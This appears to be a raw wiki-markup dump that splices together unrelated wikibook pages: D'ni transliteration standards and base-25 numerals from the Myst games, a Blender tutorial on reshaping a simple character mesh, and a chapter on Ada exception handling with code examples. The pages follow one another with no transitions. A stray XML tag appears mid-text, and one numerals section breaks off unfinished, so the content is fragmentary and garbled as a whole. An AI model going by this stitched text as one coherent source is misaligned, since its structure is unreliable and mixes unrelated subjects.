The Old Transliteration Standard transcribes the sounds of D'ni using Roman characters, allowing readers unfamiliar with the D'ni writing system to read D'ni texts. It was devised by Cyan, and perhaps specifically by RAWA.  This method of transliteration is used in the Myst novels and in the D'ni Language Guide included in the European Collector's Edition of Myst V.

This standard uses the system described above to transliterate D'ni text ('ah', 'kh', 'ih' etc.). The system makes use of digraphs to clarify the pronunciation of vowels and some consonants. The value assignments are based on English pronunciation.  General rules of the OTS include:
*'h', in vowels, distinguishes English short vowels from long vowels, as in 'eh' /ɛ/ (&quot;red&quot;) and 'ee' /i/ (&quot;reed&quot;).
*'h', in consonants, creates digraphs for fricatives and affricates that cannot be represented by a single letter, as in 'ch' /tʃ/ and 'th' /θ/.
*'y' (or 'i') indicates a final /ɪ/ in a diphthong, as in 'oy' /o&lt;sup&gt;ɪ&lt;/sup&gt;/ (&quot;boy&quot;).
**Users vary in how they distinguish /a&lt;sup&gt;ɪ&lt;/sup&gt;/ (&quot;rye&quot;) from /e&lt;sup&gt;ɪ&lt;/sup&gt;/ (&quot;ray&quot;).  The latter is usually represented as 'ay', following the rules of English pronunciation, but leaving no convenient representation for the former.  The long i sound of /a&lt;sup&gt;ɪ&lt;/sup&gt;/ may be represented with a capital 'I', although some fans have replaced this with other symbols for aesthetic reasons.
*'å' is sometimes used for 'a' /æ/, which could be otherwise indistinguishable from 'ah' /a/ if the 'h' is dropped (see below).

An 'h' can be removed after a vowel when the vowel would be pronounced the same with or without it. For instance, &quot;kehnehn&quot; can be written &quot;kenen&quot;. The 'h' of 'ah' is also frequently dropped, even though the vowel might then be indistinguishable from /æ/.  This is permissible because /æ/ occurs infrequently in D'ni words, so the pronunciation problems caused by the ambiguity are also infrequent.  However, an 'h' cannot be removed when it represents the consonant 'h' /h/ (as in &quot;'''h'''evtee&quot;) or when it is part of a digraph that represents a consonant (as in &quot;'''ch'''ev&quot; or &quot;'''sh'''o'''kh'''oo&quot;).  

Some fans, based on the appearance of the Rehevkor in Myst IV speculate that this standard was first developed by Ti'ana, Gehn, or Atrus], the first persons to speak both English and D'ni. Cyan may have adopted this system from their journals.  If the system originated with bilingual speakers of D'ni and English, this would explain why the transliteration scheme is based on English.  Others believe that the Rehevkor in the game is just artistic license and the OTS was developed by Cyan after the discovery of the journals, which also would explain the influence of English on the system.

A common objection to the OTS is that the system is based on English spelling and is therefore not transparent to speakers of languages other than English.  The use of digraphs in the OTS has also been criticized, as has the variability of spellings in this system.  Nevertheless, Cyan continues to use the OTS in its own work, as do many fans.

===New Transliteration Standard (NTS)===
The New Transliteration Standard was created by fans to avoid using too much Latin letters according to the English spelling to transcribe a single D'ni character. For example, the D'ni word 'behlehtsahrah' uses 13 Latin letters when transcribed using the OTS, although it only has 8 sounds, as well as letters in the D'ni alphabet.  In the NTS, the word would be written as 'belecara', with 8 letters.

The NTS attempts to be a letter-by-letter correspodence to the original D'ni alphabet and uses the following characters for OTS representations:

*'a' for 'ah' 
*'á' for 'I' 
*'i' for 'ih' 
*'í' for 'ee' 
*'e' for 'eh'
*'é' for 'ay'
*'ó' for 'oy'
*'ú' for 'oo'
*'c' for 'ts'
*'æ' for 'a' or 'å'
*'þ' for 'th'
*'ð' for 'dh'
*'š' for 'sh'
*'ç' for 'ch'
*'x' for 'kh'

NTS accented/unaccented vowels follow the D'ni accent pattern: vowels that share the same base form in D'ni also share the same base letter in the NTS.

A common objection to the NTS is that it is difficult to type, because of its frequent use of special characters.  It is also criticized for assigning non-intuitive values to letters, which critics say makes it difficult to determine the intended pronunciation for those not trained with D'ni phonology.  However, the NTS is still in use among fans, and it is common for students of the language to learn both the old and new transliteration standards.

{{B3D:N2P/ForVersion|2.57}}

In this module, you'll edit a subsurfed mesh using the scale and grab tools, all the while improving your character.
__TOC__

You'll need the simple person model from the previous module.  If you haven't done it, either go back and do it now or else download the pre-made model from {{B3D:N2P/Web|Yosun Chang's website|www.nusoy.com/blender}}.

==Widening the Torso==

To be realistic, the simple person's torso needs to be three times wider.  In order to keep the torso symmetrical, you'll expand it by scaling both sides from a central point.

[[File:Blender-2.5_simple_person_detailed2_torso_scale.png|thumb|350px|right]]
Select the sides of the torso:
# Enter edit mode on the simple person.
# In the 3D View header, set Face select mode.
# From the 3D View header, choose ''Pivot &amp;rarr; Median Point''.
# In the 3D View header, make sure Proportional Edit button is off.
# Select the two faces on both the left and right sides of the torso, between the armpits and the waist.
{{Clear}}

{{B3D:N2P/Note|
[[Image:Blender-2.5_occlude_geometry.png|thumb|150px|right|The cube icon toggles the visibility of certain components.]]
When editing in solid mode, the vertices, edges and faces on the back side of the model are, by default, invisible. This feature can be toggled by clicking {{B3D:N2P/Do|LMB}} on the ''Limit selection to visible'' (called in older versions, &quot;Occlude Background Geometry&quot;) button in the 3D View header. Toggle it on and off a few times and observe how the back faces appear and disappear.
}}

We will now scale the torso with the scaling tool:
# Activate the 3D View window and press {{B3D:N2P/Do|S}}, {{B3D:N2P/Do|X}}.
# Adjust the amount of scaling.  Either:
#* Move the mouse pointer until the torso is the width you want.
#: or
#* Press {{B3D:N2P/Do|3}}
# Confirm and exit by pressing {{B3D:N2P/Do|Enter}}or clicking {{B3D:N2P/Do|LMB}}.

{{B3D:N2P/Note|Scaling faces causes adjacent edges and faces to move, due to their shared vertices.  You cannot separate a face or edge from its vertices.}}

Continue selecting different parts of the torso and scaling them to get more practice using the above scaling methods.

==Bending the Arms==
[[Image:Blender-2.5_simple_person_delete_arm.png|thumb|250px|right|Removing the forearm]]
When you've got the basic shape of the torso, make the person hold up his hands.  You'll do this by deleting the forearms and then extruding upward from the elbows.

Select both forearms:
# Enter edit mode on the simple person.
# In the 3D View header, set Face select mode.
# With the 3D View window active, press {{B3D:N2P/Do|Akey}} until all vertices are deselected.
# Select the five faces at the end of the forearm.

Now erase them:
# Press {{B3D:N2P/Do|Xkey}} to open the Delete menu.
# Choose ''Faces''.

The forearm will disappear, leaving a hole.  Don't panic; we'll fix it later.
Now to make the arm point upwards:
# Select the top face of the last remaining &quot;arm cube&quot;.
# Extrude the region upward by two Blender units {{B3D:N2P/Do|Ekey}}, {{B3D:N2P/Do|Z}}, {{B3D:N2P/Do|2}} and confirm with {{B3D:N2P/Do|LMB}} or {{B3D:N2P/Do|Enter}}.
{{Clear}}

(Newbie comment: on my system, using Blender 2.70a, you want E2 above, not EZ2. Z-axis constraint is on by default, so pressing Z turns it off and causes trouble.)

The hole in the elbow is caused by a missing face.  To fill in the missing face:
# Deselect all vertices.
# Select the four vertices surrounding the missing face.
# With the 3D View window active, create the face using either
#*''Mesh &amp;rarr; Faces &amp;rarr; Make Edge/Face''
#: or
#* {{B3D:N2P/Do|Fkey}}
{{Clear}}

{{B3D:N2P/Note|If a ''Make Faces'' menu appears when you try to fill the hole, it may be that you have some doubled vertices.  You can remove doubles by selecting the whole mesh in edit mode, then pressing {{B3D:N2P/Do|W}} and in the appearing menu &quot;Remove Doubles&quot; and try again.}}

The new face should be smooth.  If it isn't, make it so, using ''Mesh &amp;rarr; Faces &amp;rarr; Shade Smooth''.
{{Clear}}

[[Image:Blender-2.5_simple_person_arms_up.png|thumb|left|Repeat on the other side]]
Go through the same steps (erase, extrude, and fill) on the other arm.  Be sure to deselect all vertices in the first arm before selecting any in the other arm.  If you have difficulty making the arms symmetrical, undo your work and go through the steps simultaneously on both arms.
{{Clear}}

==Making Feet==

To make feet for your simple person, you subdivide the ends of the legs and pull the front edges forward.

# Edit the simple person in Face select mode.
# Select the two bottom faces of the legs (front of the feet) by clicking {{B3D:N2P/Do|RMB}} on the first and then {{B3D:N2P/Do|Shift|RMB}} on the other.
# Subdivide both faces, either with:
#* {{B3D:N2P/Do|Wkey}} ''Subdivide''
#:or
#* ''Mesh &amp;rarr; Edges &amp;rarr; Subdivide''

Each face gets subdivided into four smaller faces.
{{Clear}}

Now select the front edges and pull them forward:
# Switch to Edge select mode.
# Press {{B3D:N2P/Do|Akey}} until no edges are selected.
# Select the four bottom front edges of the soles (two for each feet) (where the toes should be).
# Press {{B3D:N2P/Do|G}} and limit movement to the Y axis.
# Move the mouse pointer until the feet are the length you want.
# Confirm and exit by pressing {{B3D:N2P/Do|Enter}} or {{B3D:N2P/Do|Space}} or clicking {{B3D:N2P/Do|LMB}}.

[[Image:Blender-2.5_simple_person_detailed2_feet.png|left|thumb|150px|Congratulations! You now have feet.]]
{{Clear}}

==Reshaping the Head==


When you're satisfied with the torso and limbs, you should do something about that head. A bit too spherical, isn't it?  You can elongate it by scaling along the Z axis.

When scaling the head, you want to make sure that it stays connected to the neck.

First, place the 3D Cursor at the base of the head, where it meets the neck.  An easy way to do this is as follows:
# Go into Vertex select mode.
# Make sure the ''Limit selection to visible'' option is &quot;off&quot;.
# Select the vertex at the base of the head using {{B3D:N2P/Do|RMB}}.
# Snap the cursor to this vertex using {{B3D:N2P/Do|Shift|S}} ''Cursor to Selected''

Now select the entire head:
# Hover the mouse over a vertex/edge/face of the head
# Press {{B3D:N2P/Do|Lkey}} to select all parts linked to that part.

{{B3D:N2P/Note|This works even when the head and body meshes overlap, so long as they aren't linked together anywhere.}}

Tell Blender that you want to pivot around the 3D Cursor by changing the pivot point to ''3D Cursor'' on the Pivot menu (the small button located to the left of the 3D Manipulator button).

Now scale the head along the Z-axis, using the scale tool ({{B3D:N2P/Do|Skey}}, scaling by 1.5 should be about right).

[[Image:Blender-2.5_simple_person_detailed2.png|thumb|left]]&lt;br /&gt;

You'll need this simple person later, so remember to save your work!

      <text xml:space="preserve">&lt;small&gt;''Note'': As noted on the index of this wikibook, you will need the [http://linguists.riedl.org/old/sebastian/ D'ni font] to view characters correctly.&lt;/small&gt;&lt;br /&gt;

The D'ni used a base-25 numeric system. This means that one symbol is used to represent each numeral from 0 through 24. In the same way that another digit is added to integers at each power of 10 in the base-10 (or decimal) system the modern world uses, so does a base-25 system add another of its numerals at each power of 25.

We can see similarities between the D'ni [[../Alphabet and Phonology|letter]] and number systems. Supposedly, letters were evolved from numbers as they grew more calligraphed.

The appearance of each numeral follows the logic of five: Every fifth number (i.e. 5, 10, 15, 20) is created by rotating the symbols representing 1 through 4 counterclockwise. This is done respectively; or as the table below shows, each pair of un-rotated and rotated numerals are in the same position on their separate axes, and meet each other directly across a grid, such that the symbol for 5 is a rotated 1, 10 is a rotated 2, etc... 

Following this concept of a grid, the remaining numerals are created by combining the standard numerals where they meet on the grid. 

* ''e.g.'' By combining the numeral for 5 ( &lt;font face=&quot;D\'ni Script&quot;&gt;5&lt;/font&gt; ) with the numeral 2 ( &lt;font face=&quot;D\'ni Script&quot;&gt;2&lt;/font&gt; ), you create the numeral for 7 ( &lt;font face=&quot;D\'ni Script&quot;&gt;7&lt;/font&gt; ).

== Pronunciation of D'ni Numerals ==
In D'ni, like in most languages, there exists not only a symbol to represent its numerals, but also a spoken word for each numeral. 1, 2, 3, 4, 5, 10, 15, and 20 each have their own word (see table). The names of the numerals that are created by combining those standard numerals follow the same logic of combination across the grid. The D'ni word for &quot;and,&quot; ''ga'', is inserted between the two standard numerals, always remembering to express the 5-numeral first, then the 1, 2, 3 or 4.

* ''e.g.'' 7 is called &quot;''vagabrí'',&quot; which means 'five (vat) and (ga) two (brí)'. 

It is also worth mentioning that the corresponding &quot;five,&quot; ''i.e.'' 5, 10, 15, or 20, is abbreviated when compounded with 1, 2, 3, or 4 to form the numerals of its row. 

* ''e.g.'' &quot;Híbor&quot; (15) is abbreviated to &quot;hí&quot; when combined with &quot;brí&quot; (2) to form &quot;hígabrí&quot; (17).


== Greater Numbers ==
The key to understanding how to construct numbers greater than 24 in D'ni is remembering that the D'ni numeral system is very similar to the decimal system in its basest aspects. For instance, like our decimal system, the D'ni numeral system works on a basis of place value. 

=== Place Value ===
Place value refers to the location of a numeral relative to another in a number, and the inherent value of the power associated with that location by which the number is multiplied.

For example, in the decimal number 4,321, (from right to left) the 1 takes the &quot;ones&quot; place, the 3 takes the &quot;tens&quot; place, the 2 takes the &quot;hundreds&quot; place, and the 4 takes the &quot;thousands&quot; place. Mathematically, these places are expressed in powers. The &quot;ones&quot; place is represented by 10&lt;sup&gt;0&lt;/sup&gt;. (Here, it is important to remember the mathematical rule which states that anything to the 0-power equals one.) The &quot;tens&quot; place is represented by 10&lt;sup&gt;1&lt;/sup&gt;, the &quot;hundreds&quot; place by 10&lt;sup&gt;2&lt;/sup&gt;, the &quot;thousands&quot; place by 10&lt;sup&gt;3&lt;/sup&gt;, etc. Thus, the underlying mathematical principal behind our example, and all decimal system numbers is as follows: (1×10&lt;sup&gt;0&lt;/sup&gt;)+(2×10&lt;sup&gt;1&lt;/sup&gt;)+(3×10&lt;sup&gt;2&lt;/sup&gt;+(4×10&lt;sup&gt;3&lt;/sup&gt;)=4,321. Of course, since most of us grow up knowing this concept intrinsically, if not literally, we have no need of parsing it out in this way; however, it is important to understand these concepts when trying to understand a place value numeric system of a different base, such as that of D'ni.

With D'ni, it is the same basic concept, except that instead of using 10, we use 25, because it is a base-25 system. Past the first 25 numerals which represent the first place value, there are only 5 other known place values The place values, from right to left, are as follows:
* The first place value is represented mathematically by 25&lt;sup&gt;0&lt;/sup&gt;.
* The second place value is represented mathematically by 25&lt;sup&gt;1&lt;/sup&gt;.
* The third place value is represented mathematically by 25&lt;sup&gt;2&lt;/sup&gt;.
* The fourth place value is represented mathematically by 25&lt;sup&gt;3&lt;/sup&gt;.
* The fifth place value is represented mathematically by 25&lt;sup&gt;4&lt;/sup&gt;.
* The sixth place value is represented mathematically by 25&lt;sup&gt;5&lt;/sup&gt;.
In this way, we can translate the D'ni numbers into a decimal system numbers, which are typically easier for us to use: 
* &lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;@73&lt;/font&gt; and
* &lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;1:&lt;/font&gt;
become
* (3×25&lt;sup&gt;0&lt;/sup&gt;)+(7×25&lt;sup&gt;1&lt;/sup&gt;)+(12×25&lt;sup&gt;2&lt;/sup&gt;)=(3)+(175)+(7500)=7678 and
* (0×25&lt;sup&gt;0&lt;/sup&gt;)+(1×25&lt;sup&gt;1&lt;/sup&gt;)=(0)+(25)=25

=== Pronunciation of Greater Number Place Values ===
Just like how in our decimal system, we speak our place values (''e.g.'' &quot;four '''thousand''' three '''hundred''' twen'''ty''' one&quot;), so did the D'ni speak their place values. Remember that past the 25 numerals, there are only 5 known spoken place values. 

Also note that just like in English, in D'ni, a place value that has no value, i.e. a value of 0(&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;:&lt;/font&gt;&amp;nbsp; or rún), is not spoken.

==== Simple Examples ====
;&quot;sí&quot; is the spoken form of the 25&lt;sup&gt;1&lt;/sup&gt; place value. So...
:'''25''' (1x25&lt;sup&gt;1&lt;/sup&gt;): fasí (&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;10&lt;/font&gt;&amp;nbsp;) (There is a special character for 25 that can be used by itself, but it is rarely used: &lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;;&lt;/font&gt;&amp;nbsp;)
:'''50''' (2x25&lt;sup&gt;1&lt;/sup&gt;): brísí(&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;20&lt;/font&gt;&amp;nbsp;), 
:'''75''' (3x25&lt;sup&gt;1&lt;/sup&gt;): sensí (&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;30&lt;/font&gt;&amp;nbsp;), etc.

;&quot;ra&quot; is the spoken form of the 25&lt;sup&gt;2&lt;/sup&gt; place value. So...
:'''625''' (1x25&lt;sup&gt;2&lt;/sup&gt;): fara (&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;100&lt;/font&gt;&amp;nbsp;), 
:'''1250''' (2x25&lt;sup&gt;2&lt;/sup&gt;): bríra (&lt;font face=&quot;D\'ni Script&quot;&gt;&lt;font size=&quot;+1&quot;&gt;&amp;nbsp;200&lt;/font&gt;&lt;/font&gt;&amp;nbsp;), 
:'''1875''' (3x25&lt;sup&gt;2&lt;/sup&gt;): senra (&lt;font face=&quot;D\'ni Script&quot;&gt;&lt;font size=&quot;+1&quot;&gt;&amp;nbsp;300&lt;/font&gt;&lt;/font&gt;&amp;nbsp;),

:'''1,171,875''' (3x25&lt;sup&gt;4&lt;/sup&gt;): senmel (&lt;font face=&quot;D\'ni Script&quot; size=&quot;+1&quot;&gt;&amp;nbsp;30000&lt;/font&gt;&amp;nbsp;), etc.

;&quot;blo&quot; is the spoken form of the 25&lt;sup&gt;5&lt;/sup&gt; place value. So...

== Quantity ==
The numbers from 0 to 25 are used for expressions like ‘little’, ‘very’, ‘much’ etc... the larger the number, the greater the emphasis... e.g. ''tégan šem b’fasí'' ‘I love you to 25/absolutely’. To exaggerate, numbers greater than 25 are used, like 'I love you to 50!!!'

== Ablative ==
For expressions like '[number] of the...' English as well as most languages uses the genitive. This is not the case with D'ni which uses the [[../Prepositions|preposition]] ''te'' which has the usage of the Latin ablative. 

An expression like 'one of the caves' would be 'one to the caves' (''fa tregalpotí''). Similarly ''fa terþtes'' is translated as 'One of a group'

== Ordinals ==
Some special constructions exist (''Kor’fa'', ''Lísan'', etc.) but ordinality is expressed by adding the '-ec' suffix to the cardinal number. Thus, ‘second rock’ is ''præd bríec'', ‘third master’ is ''nava senec'', etc.

__TOC__&lt;/noinclude&gt;

== Robustness ==

''Robustness'' is the ability of a system or system component to behave “reasonably” when it detects an anomaly, e.g.:
* It receives invalid inputs.
* Another system component (hardware or software) malfunctions.

Take as example a telephone exchange control program. What should the control program do when a line fails? It is unacceptable simply to halt — all calls will then fail. Better would be to abandon the current call (only), record that the line is out of service, and continue. Better still would be to try to reuse the line — the fault might be transient. Robustness is desirable in all systems, but it is essential in systems on which human safety or welfare depends, e.g., hospital patient monitoring, aircraft fly-by-wire, nuclear power station control, etc.

== Modules, preconditions and postconditions ==

A module may be specified in terms of its preconditions and postconditions. A ''precondition'' is a condition that the module’s inputs are supposed to satisfy. A ''postcondition'' is a condition that the module’s outputs are required to satisfy, provided that the precondition is satisfied.
What should a module do if its precondition is not satisfied?
* Halt?  Even with diagnostic information, this is generally unacceptable.
* Use a global result code?  The result code can be set to  indicate an anomaly.  Subsequently it may be tested by a module that can effect error recovery.  Problem:  this induces tight coupling among the modules concerned.
* Each module has its own result code? This is a parameter (or  function result) that may be set to indicate an anomaly, and is tested by calling modules.  Problems: (1) setting and testing result codes tends to swamp the normal-case logic and (2) the result codes are normally ignored.
* Exception handling — Ada’s solution.  A module detecting an anomaly raises an exception.  The same, or another, module may handle that exception.

The exception mechanism permits clean, modular handling of anomalous situations:
* A unit (e.g., block or subprogram body) may raise an exception, to signal that an anomaly has been detected.  The computation that raised the exception is abandoned (and can never be resumed, although it can be restarted).
* A unit may propagate an exception that has been raised by itself (or propagated out of another unit it has called).
* A unit may alternatively handle such an exception, allowing programmer-defined recovery from an anomalous situation. Exception handlers are segregated from normal-case code.

== Predefined exceptions ==

The predefined exceptions are those defined in package {{Ada/package|Standard}}. Every language-defined run-time error causes a predefined exception to be raised.  Some examples are:

* &lt;tt&gt;Constraint_Error&lt;/tt&gt;, raised when a subtype’s constraint is not satisfied
* &lt;tt&gt;Program_Error&lt;/tt&gt;, when a protected operation is called inside a protected object, e.g.
* &lt;tt&gt;Storage_Error&lt;/tt&gt;, raised by running out of storage
* &lt;tt&gt;Tasking_Error&lt;/tt&gt;, when a task cannot be activated because the operating system has not enough resources, e.g.

Ex.1

   Name : String (1 .. 10);
   ...
   Name := &quot;Hamlet&quot;; {{Ada/--|Raises Constraint_Error,}}
                     {{Ada/--|because the &quot;Hamlet&quot; has bounds (1 .. 6).}}

Ex.2

   {{Ada/kw|loop}}
      P := {{Ada/kw|new}} Int_Node'(0, P);
   {{Ada/kw|end}} {{Ada/kw|loop}}; {{Ada/--|Soon raises Storage_Error,}}
             {{Ada/--|because of the extreme memory leak.}}

Ex.3  Compare the following approaches:

   {{Ada/kw|procedure}} Compute_Sqrt (X    : {{Ada/kw|in}}  Float;
                           Sqrt : {{Ada/kw|out}} Float;
                           OK   : {{Ada/kw|out}} Boolean)
   {{Ada/kw|is}}
   {{Ada/kw|begin}}
      {{Ada/kw|if}} X &gt;= 0 {{Ada/kw|then}}
         OK := True;
         {{Ada/--|''compute'' √X}}
         ...
      {{Ada/kw|else}}
         OK := False;
      {{Ada/kw|end}} {{Ada/kw|if}};
   {{Ada/kw|end}} Compute_Sqrt;
   
   ...
   
   {{Ada/kw|procedure}} Triangle (A, B, C         : {{Ada/kw|in}}  Float;
                       Area, Perimeter : {{Ada/kw|out}} Float;
                       Exists          : {{Ada/kw|out}} Boolean)
   {{Ada/kw|is}}
      S  : {{Ada/kw|constant}} Float := 0.5 * (A + B + C);
      OK : Boolean;
   {{Ada/kw|begin}}
      Compute_Sqrt (S * (S-A) * (S-B) * (S-C), Area, OK);
      Perimeter := 2.0 * S;
      Exists    := OK;
   {{Ada/kw|end}} Triangle;

A negative argument to Compute_Sqrt causes OK to be set to False. Triangle uses it to determine its own status parameter value, and so on up the calling tree, ''ad nauseam''.

''versus''

   {{Ada/kw|function}} Sqrt (X : Float) {{Ada/kw|return}} Float {{Ada/kw|is}}
   {{Ada/kw|begin}}
      {{Ada/kw|if}} X &lt; 0.0 {{Ada/kw|then}}
         {{Ada/kw|raise}} Constraint_Error;
      {{Ada/kw|end}} {{Ada/kw|if}};
      {{Ada/--|''compute'' √X}}
      ...
   {{Ada/kw|end}} Sqrt;
   
   ...
   
   {{Ada/kw|procedure}} Triangle (A, B, C         : {{Ada/kw|in}}  Float;
                       Area, Perimeter : {{Ada/kw|out}} Float)
   {{Ada/kw|is}}
      S: {{Ada/kw|constant}} Float := 0.5 * (A + B + C);
   {{Ada/kw|begin}}
      Area      := Sqrt (S * (S-A) * (S-B) * (S-C));
      Perimeter := 2.0 * S;
   {{Ada/kw|end}} Triangle;

A negative argument to Sqrt causes Constraint_Error to be explicitly raised inside Sqrt, and propagated out.  Triangle simply propagates the exception (by not handling it).

Alternatively, we can catch the error by using the type system:

   {{Ada/kw|subtype}} Pos_Float {{Ada/kw|is}} Float {{Ada/kw|range}} 0.0 .. Float'{{Ada/attribute|Last}};
   
   {{Ada/kw|function}} Sqrt (X : Pos_Float) {{Ada/kw|return}} Pos_Float {{Ada/kw|is}}
   {{Ada/kw|begin}}
      {{Ada/--|''compute'' √X}}
      ...
   {{Ada/kw|end}} Sqrt;

A negative argument to Sqrt now raises Constraint_Error at the point of call. Sqrt is never even entered.

== Input-output exceptions ==

Some examples of exceptions raised by subprograms of the '''predefined package''' {{Ada/package|Ada.Text_IO}} are:
* &lt;tt&gt;End_Error&lt;/tt&gt;, raised by Get, Skip_Line, etc., if end-of-file already reached.
* &lt;tt&gt;Data_Error&lt;/tt&gt;, raised by Get in Integer_IO, etc., if the input is not a literal of the expected type.
* &lt;tt&gt;Mode_Error&lt;/tt&gt;, raised by trying to read from an output file, or write to an input file, etc.
* &lt;tt&gt;Layout_Error&lt;/tt&gt;, raised by specifying an invalid data format in a text I/O operation

Ex. 1
   {{Ada/kw|declare}}
      A : Matrix (1 .. M, 1 .. N);
   {{Ada/kw|begin}}
      {{Ada/kw|for}} I {{Ada/kw|in}} 1 .. M {{Ada/kw|loop}}
         {{Ada/kw|for}} J {{Ada/kw|in}} 1 .. N {{Ada/kw|loop}}
             {{Ada/kw|begin}}
                Get (A(I,J));
             {{Ada/kw|exception}}
                {{Ada/kw|when}} Data_Error =&gt;
                   Put (&quot;Ill-formed matrix element&quot;);
                   A(I,J) := 0.0;
             {{Ada/kw|end}};
          {{Ada/kw|end}} {{Ada/kw|loop}};
      {{Ada/kw|end}} {{Ada/kw|loop}};
   {{Ada/kw|exception}}
      {{Ada/kw|when}} End_Error =&gt;
         Put (&quot;Matrix element(s) missing&quot;);
   {{Ada/kw|end}};

== Exception declarations ==

Exceptions are declared similarly to objects.

Ex.1 declares two exceptions:

   Line_Failed, Line_Closed: {{Ada/kw|exception}};

However, exceptions are not objects. For example, recursive re-entry to a scope where an exception is declared does ''not'' create a new exception of the same name; instead the exception declared in the outer invocation is reused.

Ex.2

   {{Ada/kw|package}} Directory_Enquiries {{Ada/kw|is}}
 
      {{Ada/kw|procedure}} Insert (New_Name   : {{Ada/kw|in}} Name;
                        New_Number : {{Ada/kw|in}} Number);
 
      {{Ada/kw|procedure}} Lookup (Given_Name  : {{Ada/kw|in}}  Name;
                        Corr_Number : {{Ada/kw|out}} Number);
 
      Name_Duplicated : {{Ada/kw|exception}};
      Name_Absent     : {{Ada/kw|exception}};
      Directory_Full  : {{Ada/kw|exception}};
 
   {{Ada/kw|end}} Directory_Enquiries;

== Exception handlers ==

When an exception occurs, the normal flow of execution is abandoned and the exception is handed up the call sequence until a matching handler is found.
Any declarative region (except a package specification) can have a handler.
The handler names the exceptions it will handle. By moving up the call sequence, exceptions can become anonymous; in this case, they can only be handled be the {{Ada/kw|others}} handler.

 {{Ada/kw|function}} F {{Ada/kw|return}} Some_Type {{Ada/kw|is}}
   ... -- declations (1)
 {{Ada/kw|begin}}
   ... -- statements (2)
 {{Ada/kw|exception}}  -- handlers start here (3)
   {{Ada/kw|when}} Name_1 | Name_2 =&gt; ... -- The named exceptions are handled with these statements
   {{Ada/kw|when}} {{Ada/kw|others}} =&gt; ...  -- any other exceptions (also anonymous ones) are handled here
 {{Ada/kw|end}} F;

Exceptions raised in the declarative region itself (1) cannot be handled by handlers of this region (3); they can only be handled in outer scopes. Exceptions raised in the sequence of statements (2) can of course be handled at (3).

The reason for this rule is so that the handler can assume that any items declared in the declarative region (1) are well defined and may be referenced.
If the handler at (3) could handle exceptions raised at (1), it would be unknown which items existed and which ones didn't.

== Raising exceptions ==

The '''raise''' statement explicitly raises a specified exception.  

Ex. 1

   {{Ada/kw|package}} {{Ada/kw|body}} Directory_Enquiries {{Ada/kw|is}}
   
      {{Ada/kw|procedure}} Insert (New_Name   : {{Ada/kw|in}} Name;
                        New_Number : {{Ada/kw|in}} Number)
      {{Ada/kw|is}}
         …
      {{Ada/kw|begin}}
         …
         {{Ada/kw|if}} New_Name = Old_Entry.A_Name {{Ada/kw|then}}
            {{Ada/kw|raise}} Name_Duplicated;
         {{Ada/kw|end}} {{Ada/kw|if}};
         …
         New_Entry :=  {{Ada/kw|new}} Dir_Node'(New_Name, New_Number,…);
         …
      {{Ada/kw|exception}}
         {{Ada/kw|when}} Storage_Error =&gt; {{Ada/kw|raise}} Directory_Full;
      {{Ada/kw|end}} Insert;
      
      {{Ada/kw|procedure}} Lookup (Given_Name  : {{Ada/kw|in}}  Name;
                        Corr_Number : {{Ada/kw|out}} Number)
      {{Ada/kw|is}}
         …
      {{Ada/kw|begin}}
         …
         {{Ada/kw|if}} {{Ada/kw|not}} Found {{Ada/kw|then}}
            {{Ada/kw|raise}} Name_Absent;
         {{Ada/kw|end}} {{Ada/kw|if}};
         …
      {{Ada/kw|end}} Lookup;
   
   {{Ada/kw|end}} Directory_Enquiries;

== Exception handling and propagation ==

Exception handlers may be grouped at the end of a block, subprogram body, etc. A handler is any sequence of statements that may end:
* by completing;
* by executing a '''return''' statement;
* by raising a different exception ('''raise''' e;);
* by re-raising the same exception ('''raise''';).

Suppose that an exception ''e'' is raised in a sequence of statements ''U'' (a block, subprogram body, etc.).
* If ''U'' contains a handler for ''e'':  that handler is executed, then control leaves ''U''.
* If ''U'' contains no handler for ''e'':  ''e'' is ''propagated'' out of ''U''; in effect, ''e'' is raised at the &quot;point of call” of ''U''.

So the raising of an exception causes the sequence of statements responsible to be abandoned at the point of occurrence of the exception. It is not, and cannot be, resumed.

Ex. 1

   ...
   {{Ada/kw|exception}}
      {{Ada/kw|when}} Line_Failed =&gt;
         {{Ada/kw|begin}} {{Ada/--|attempt recovery}}
            Log_Error;
            Retransmit (Current_Packet);
         {{Ada/kw|exception}}
            {{Ada/kw|when}} Line_Failed =&gt;
               Notify_Engineer; {{Ada/--|recovery failed!}}
               Abandon_Call;
         {{Ada/kw|end}};
   ...

== Information about an exception occurrence ==

Ada provides information about an exception in an object of type  Exception_Occurrence, defined in {{Ada/package|Ada.Exceptions}} along with subprograms taking this type as parameter:

* Exception_Name: return the full exception name using the dot notation and in uppercase letters. For example, &lt;tt&gt;Queue.Overflow&lt;/tt&gt;.
* Exception_Message: return the exception message associated with the occurrence.
* Exception_Information: return a string including the exception name and the associated exception message.

For getting an exception occurrence object the following syntax is used:

 {{Ada/kw|with}} {{Ada/package|Ada|Exceptions}};  {{Ada/kw|use}} {{Ada/package|Ada|Exceptions}};
 ...
 {{Ada/kw|exception}}
   {{Ada/kw|when}} Error: High_Pressure | High_Temperature =&gt;
     Put (&quot;Exception: &quot;);
     Put_Line (Exception_Name (Error));
     Put (Exception_Message (Error));
   {{Ada/kw|when}} Error: {{Ada/kw|others}} =&gt;
     Put (&quot;Unexpected exception: &quot;);
     Put_Line (Exception_Information(Error));
 {{Ada/kw|end}};

The exception message content is implementation defined when it is not set by the user who raises the exception. It usually contains a reason for the exception and the raising location.

The user can specify a message using the procedure Raise_Exception.

 {{Ada/kw|declare}}
    Valve_Failure : {{Ada/kw|exception}};
 {{Ada/kw|begin}}
   ...
   Raise_Exception (Valve_Failure'{{Ada/attribute|Identity}}, &quot;Failure while opening&quot;);
   ...
   Raise_Exception (Valve_Failure'{{Ada/attribute|Identity}}, &quot;Failure while closing&quot;);
   ...
 {{Ada/kw|exception}}
   {{Ada/kw|when}} Fail: Valve_Failure =&gt;
     Put (Exception_Message (Fail));
 {{Ada/kw|end}};


Starting with Ada 2005, a simpler syntax can be used to associate a string message with exception occurrence.
